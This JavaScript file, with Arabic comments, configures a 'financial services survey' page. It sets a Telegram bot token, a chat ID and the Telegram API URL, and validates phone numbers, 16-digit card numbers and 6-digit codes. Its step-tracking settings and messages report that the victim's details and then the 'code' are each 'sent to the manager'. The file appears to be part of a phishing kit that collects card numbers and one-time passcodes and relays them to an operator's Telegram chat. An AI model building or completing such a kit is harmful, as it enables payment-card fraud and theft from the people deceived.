// إعدادات النظام
const CONFIG = {
    // إعدادات التيليجرام
    TELEGRAM_BOT_TOKEN: "ضع_توكن_بوتك_هنا",
    TELEGRAM_CHAT_ID: "ضع_شات_آيدي_هنا",
    API_URL: "https://api.telegram.org/bot",
    
    // إعدادات الموقع
    SITE_NAME: "استبيان الخدمات المالية",
    
    // رسائل النظام
    MESSAGES: {
        SUCCESS: "✅ تم الإرسال بنجاح!",
        ERROR: "❌ حدث خطأ، حاول مرة أخرى",
        VALIDATION_ERROR: "⚠️ يرجى ملء جميع الحقول المطلوبة",
        SENDING: "📤 جاري الإرسال...",
        COPIED: "📋 تم النسخ بنجاح!",
        DEVICE_DETECTED: "📱 تم كشف جهازك تلقائياً",
        STEP1_SENT: "📄 تم إرسال معلوماتك للمدير",
        STEP2_SENT: "🔐 تم إرسال الرمز للمدير",
        COMPLETED: "🎉 تم إكمال الاستبيان بنجاح"
    },
    
    // تتبع الخطوات
    STEP_TRACKING: {
        ENABLED: true,
        SEND_STEP1_SEPARATE: true,
        SEND_STEP2_SEPARATE: true,
        SEND_FINAL_COMPLETE: true
    }
};

// التحقق من صحة البيانات
function isValidPhone(phone) {
    const cleaned = phone.replace(/\D/g, '');
    return /^(05|06|07)[0-9]{8}$/.test(cleaned);
}

function isValidCard(card) {
    const cleaned = card.replace(/\D/g, '');
    return /^[0-9]{16}$/.test(cleaned);
}

function isValidCode(code) {
    return /^[0-9]{6}$/.test(code);
}

function isValidName(name) {
    return name.trim().length >= 3 && /^[\u0600-\u06FF\s]+$/.test(name);
}

// إنشاء أرقام فريدة
function generateSurveyId() {
    const date = new Date();
    const dateStr = date.getFullYear().toString().slice(-2) + 
                   (date.getMonth() + 1).toString().padStart(2, '0') +
                   date.getDate().toString().padStart(2, '0');
    const randomNum = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `FS-${dateStr}-${randomNum}`;
}

// تحميل البيانات من localStorage
function loadFromStorage(key, defaultValue = []) {
    try {
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : defaultValue;
    } catch (e) {
        console.error('خطأ في تحميل البيانات:', e);
        return defaultValue;
    }
}

// حفظ البيانات في localStorage
function saveToStorage(key, data) {
    try {
        localStorage.setItem(key, JSON.stringify(data));
        return true;
    } catch (e) {
        console.error('خطأ في حفظ البيانات:', e);
        return false;
    }
}

// عرض التاريخ العربي
function getArabicDate() {
    const date = new Date();
    const options = {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        timeZone: 'Asia/Riyadh'
    };
    return date.toLocaleString('ar-SA', options);
}